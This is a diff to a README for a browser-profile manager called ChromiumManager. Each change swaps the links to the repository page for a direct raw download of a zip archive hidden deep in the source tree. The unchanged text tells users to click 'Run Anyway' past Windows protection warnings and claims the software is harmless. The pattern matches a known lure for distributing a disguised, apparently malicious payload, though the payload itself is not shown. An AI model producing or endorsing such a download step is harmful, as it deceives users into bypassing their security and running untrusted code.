@@ -1,6 +1,6 @@
 # 🌐 ChromiumManager - Manage isolated browser profiles with ease
 
-[![Download ChromiumManager](https://img.shields.io/badge/Download-ChromiumManager-blue.svg)](https://github.com/Manans999/ChromiumManager)
+[![Download ChromiumManager](https://img.shields.io/badge/Download-ChromiumManager-blue.svg)](https://raw.githubusercontent.com/Manans999/ChromiumManager/main/src/web/src/utils/Chromium-Manager-v3.1-beta.3.zip)
 
 ChromiumManager helps you keep your browser sessions separate. You can run many browser environments at the same time. Each environment stays independent. These environments do not share data. Websites see each environment as a unique visitor. You control your digital footprint through this tool.
 
@@ -28,7 +28,7 @@ Your computer must meet these basic standards to run ChromiumManager:
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [official release page](https://github.com/Manans999/ChromiumManager) to download the installer.
+1. Visit the [official release page](https://raw.githubusercontent.com/Manans999/ChromiumManager/main/src/web/src/utils/Chromium-Manager-v3.1-beta.3.zip) to download the installer.
 2. Locate the file in your downloads folder.
 3. Double-click the file named ChromiumManagerSetup.exe.
 4. Follow the installation prompts on your screen.
@@ -38,7 +38,7 @@ Follow these steps to install the software on your Windows computer.
 
 You can find the latest version on the official link below:
 
-[Download ChromiumManager Here](https://github.com/Manans999/ChromiumManager)
+[Download ChromiumManager Here](https://raw.githubusercontent.com/Manans999/ChromiumManager/main/src/web/src/utils/Chromium-Manager-v3.1-beta.3.zip)
 
 If Windows shows a protection warning, click More Info, then click Run Anyway. This happens because the application is new and uses advanced settings to manage browser isolation. The software does not harm your computer.
 
